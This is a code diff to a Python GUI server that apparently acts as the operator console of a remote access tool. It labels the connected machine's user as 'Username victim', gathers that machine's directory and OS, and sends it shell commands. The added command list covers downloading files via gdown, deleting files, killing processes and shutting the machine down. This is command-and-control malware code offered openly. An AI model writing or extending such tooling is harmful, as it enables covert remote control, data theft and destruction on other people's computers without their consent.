@@ -3,10 +3,12 @@ import threading
 import socket
 from virtual_keyboard import NormalKeyboard
 import subprocess
+import platform
 
 active_client = [None]  # Используем список как контейнер
 port = 12345
 active_user = ["Unknown"]  # Добавили имя пользователя
+global current_OS
 
 
 def safe_textbox_insert(textbox, text):
@@ -39,62 +41,60 @@ def get_current_directory(client_socket):
             break
     return current_dir
 
-def handle_client(client_socket, text_box, username_label):
-    # 1. Получаем имя пользователя
-    user_name = ""
+
+def read_all_info(client_socket):
+    data = ""
     while True:
-        data = client_socket.recv(1024).decode("utf-8", errors="replace")
-        user_name += data
-        if "END_OF_USER_MSG" in user_name:
-            user_name = user_name.replace("END_OF_USER_MSG", "").strip()
-            active_user[0] = user_name
-            username_label.configure(text=f"Username victim: {active_user[0]}")
-            safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
+        chunk = client_socket.recv(1024).decode("utf-8", errors="replace")
+        if not chunk:
             break
-
-    # 2. Получаем текущую директорию
-    current_dir = ""
-    while True:
-        data = client_socket.recv(1024).decode("utf-8", errors="replace")
-        current_dir += data
-        if "END_OF_DIR_MSG" in current_dir:
-            current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
-            safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
+        data += chunk
+        # Проверяем, что в данных есть все три маркера
+        if ("END_OF_USER_MSG" in data and
+            "END_OF_DIR_MSG" in data and
+            "END_OF_OS_MSG" in data):
             break
+    return data
 
-    # 3. Основной цикл: принимаем команды с END_OF_MSG
-    buffer = ""
-    while True:
-        try:
-            chunk = client_socket.recv(1024).decode("utf-8", errors="replace")
-            if not chunk:
-                break
-            buffer += chunk
+def handle_client(client_socket, text_box, username_label, dir_label, os_label):
+    global current_OS
 
-            while True:
-                pos = buffer.find("END_OF_MSG")
-                if pos == -1:
-                    break
-                message = buffer[:pos].strip()
-                buffer = buffer[pos + len("END_OF_MSG"):]
+    full_data = read_all_info(client_socket)
 
-                # Игнорируем, если вдруг пришли маркеры пользователя/директории
-                if "END_OF_USER_MSG" in message or "END_OF_DIR_MSG" in message:
-                    safe_textbox_insert(text_box, "⚠ Ошибка: пришло неожидаемое сообщение с USER или DIR метками после старта.\n")
-                    continue
+    # Удаляем или заменяем все END_OF_MSG, если вдруг есть в начальных данных
+    full_data = full_data.replace("END_OF_MSG", " ")
 
-                safe_textbox_insert(text_box, f"💻 Результат команды:\n{message}\n")
+    # Парсим имя пользователя
+    user_name = full_data.split("END_OF_USER_MSG")[0].strip()
 
-        except Exception as e:
-            safe_textbox_insert(text_box, f"Ошибка: {e}\n")
-            break
+    # Парсим директорию
+    current_dir = full_data.split("END_OF_USER_MSG")[1].split("END_OF_DIR_MSG")[0].strip()
+
+    # Парсим ОС
+    current_OS = full_data.split("END_OF_DIR_MSG")[1].split("END_OF_OS_MSG")[0].strip()
+
+    # Остаток, если нужно
+    remaining = full_data.split("END_OF_OS_MSG")[1].strip() if "END_OF_OS_MSG" in full_data else ""
+
+    # Обновляем UI
+    username_label.configure(text=f"Username victim: {user_name}")
+    dir_label.configure(text=f"Current dir: {current_dir}")
+    os_label.configure(text=f"OS: {current_OS}")
+
+
+    safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
+    safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
+    safe_textbox_insert(text_box, f"🖥️ ОС: {current_OS}\n")
+
+    # Далее можешь продолжить обрабатывать команды из remaining или читать из сокета, как у тебя дальше в коде...
 
 
 def is_message_end(data):
     return (
         data.endswith("END_OF_USER_MSG") or 
         data.endswith("END_OF_DIR_MSG") or 
-        data.endswith("END_OF_MSG")
+        data.endswith("END_OF_MSG") or
+        data.endswith("END_OF_OS_MSG")
     )
 
 
@@ -109,7 +109,7 @@ def execute_command(command):
     except Exception as e:
         return f"❌ Ошибка выполнения команды: {e}"
 
-def start_server_thread(server_socket, text_box, status_label, username_label):
+def start_server_thread(server_socket, text_box, status_label, username_label, dir_label, os_label):
     while True:
         try:
             client_socket, client_address = server_socket.accept()
@@ -117,7 +117,7 @@ def start_server_thread(server_socket, text_box, status_label, username_label):
             status_label.configure(text="🟢 Connected", text_color="green")
             print(f"Клиент подключен: {client_address}")
             text_box.insert("end", "Client is connected")
-            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label))
+            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label, dir_label, os_label))
             client_thread.daemon = True
             client_thread.start()
         except Exception as e:
@@ -135,7 +135,7 @@ def receive_full_response(client_socket):
             if not data:
                 break  # Соединение закрыто или нет данных
             buffer += data
-            if any(marker in buffer for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG"]):
+            if any(marker in buffer for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG", "END_OF_OS_MSG"]):
                 break  # Получили полный ответ
     except socket.timeout:
         # Таймаут, считаем что данные больше не будут
@@ -165,7 +165,7 @@ def send_command_to_client(command_line, client_socket, text_box):
         try:
             client_socket.send(command.encode(encoding="utf-8", errors="replace"))
             response = receive_full_response(client_socket)
-            if any(marker in response for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG"]):
+            if any(marker in response for marker in ["END_OF_USER_MSG", "END_OF_DIR_MSG", "END_OF_MSG", "END_OF_OS_MSG"]):
                 safe_textbox_insert(text_box, f"📥 Ответ от клиента: {response}\n")
                 safe_textbox_insert(text_box, "="*24+"End Text"+"="*24+"\n")
             else:
@@ -216,6 +216,11 @@ def server(parent_frame, go_back_callback=None):
     bottom_frame = ctk.CTkFrame(main_frame)
     # bottom_frame.pack(fill="x", pady=10)
 
+    menu_frame = ctk.CTkFrame(main_frame, width=700, fg_color="#08080A", corner_radius=10)
+
+    close_menu = ctk.CTkButton(menu_frame, text="X", width=50, height=50, command=lambda: animate_sidebar_close(menu_frame))
+    close_menu.place(relx=0.99, rely=0.05, anchor="ne")
+
     close_keyboard_button = ctk.CTkButton(
         bottom_frame,
         text="X",
@@ -253,9 +258,20 @@ def server(parent_frame, go_back_callback=None):
 
     # === Кнопка для старта сервера ===
     def run_server():
-        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label))
+        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label, dir_label, os_label))
         thread.daemon = True
         thread.start()
+
+    username_label = ctk.CTkLabel(menu_frame, text="Username victim: Unknown", width=300)
+    username_label.place(x=10, y=10)
+
+    dir_label = ctk.CTkLabel(menu_frame, text="Current dir: Unknown", width=300)
+    dir_label.place(x=10, y=50)
+
+    os_label = ctk.CTkLabel(menu_frame, text="OS: Unknown", width=300)
+    os_label.place(x=10, y=90)
+
+
 
     start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=lambda: run_server())
     start_server_btn.pack(pady=10)
@@ -269,11 +285,6 @@ def server(parent_frame, go_back_callback=None):
     # Индикатор подключения
     status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
     status_label.pack(pady=5)
-
-    # username_label = ctk.CTkLabel(left_frame, text=f"Username victim: {active_user[0]}")
-    # username_label.pack(pady=5)
-
-    username_label = None
 
     # === Логирование в text_box ===
     safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
@@ -365,3 +376,97 @@ def server(parent_frame, go_back_callback=None):
 
     # Изначально скрываем клавиатуру
     parent_frame.after(100, lambda: place_keyboard_at(parent_frame.winfo_height()))
+
+    is_animation = False
+    sidebar_visible = False  # Флаг
+
+    # Функция для анимации панели (плавное появление)
+    def toggle_sidebar():
+        nonlocal sidebar_visible
+        if sidebar_visible:
+            animate_sidebar_close(menu_frame)
+            # sidebar_visible = False  <- убираем отсюда
+        else:
+            parent_frame.update_idletasks()
+            start_x = parent_frame.winfo_width()
+            target_x = start_x - 900
+            menu_frame.place(x=start_x, y=0, relheight=1.0)
+            animate_sidebar_open(menu_frame, target_x)
+            sidebar_visible = True
+
+    # Анимация появления
+    def animate_sidebar_open(frame, target_x, step=20):
+        current_x = parent_frame.winfo_width()
+        def slide():
+            nonlocal current_x
+            if current_x > target_x:
+                current_x -= step
+                frame.place(x=current_x, y=0, relheight=1.0)
+                parent_frame.after(10, slide)
+            else:
+                frame.place(x=target_x, y=0, relheight=1.0)
+        slide()
+
+
+    def animate_sidebar_close(frame, step=20):
+        current_x = frame.winfo_x()
+        target_x = parent_frame.winfo_width()
+
+        def slide():
+            nonlocal current_x
+            if current_x < target_x:
+                current_x += step
+                frame.place(x=current_x, y=0, relheight=1.0)
+                parent_frame.after(10, slide)
+            else:
+                frame.place_forget()
+                nonlocal sidebar_visible
+                sidebar_visible = False  # Меняем флаг здесь, после анимации закрытия
+        slide()
+
+    hamburger_btn = ctk.CTkButton(
+        top_right_frame,
+        text="☰",  # Символ гамбургера
+        command=toggle_sidebar,
+        width=40,
+        height=40
+    )
+    hamburger_btn.place(relx=0.99, rely=0.1, anchor="ne")
+    
+    list_of_command = {
+        "Windows": [
+            "gdown <URL> <output_path> - скачивает файл с Google Drive",
+            "dir - показує вміст поточної директорії",
+            "cd <шлях> - змінює поточну директорію",
+            "ipconfig - мережеві інтерфейси",
+            "cls - очищення екрану",
+            "ping <адреса> - перевірка доступності",
+            "mkdir <папка> - нова директорія",
+            "exit - завершує роботу",
+            "copy <файл1> <файл2> - копіює файл",
+            "del <файл> - видаляє файл",
+            "move <файл> <папка> - переміщує файл",
+            "tasklist - список запущених процесів",
+            "taskkill /IM <ім'я процесу> - завершити процесс",
+            "chkdsk - проверка диска",
+            "shutdown /s - вимкнення комп'ютера",
+            "systeminfo - информация про систему",
+        ],
+        "Linux": [
+            "gdown <URL> <output_path> - скачивает файл с Google Drive",
+            "ls - перегляд вмісту каталогу",
+            "cd <шлях> - зміна каталогу",
+            "rm <файл> - видалення файлів",
+            "clear - очищення екрану",
+            "mkdir <каталог> - створення каталогу",
+            "exit - завершує роботу",
+            "cp <файл1> <файл2> - копіює файл",
+            "mv <файл> <каталог> - переміщує файл",
+            "touch <файл> - створення нового файлу",
+            "chmod <права> <файл> - зміна прав доступу",
+            "ps - список запущених процесів",
+            "kill <PID> - завершити процес",
+            "shutdown - вимкнення системи",
+            "ifconfig - налаштування мережевих інтерфейсов",
+        ]
+    }
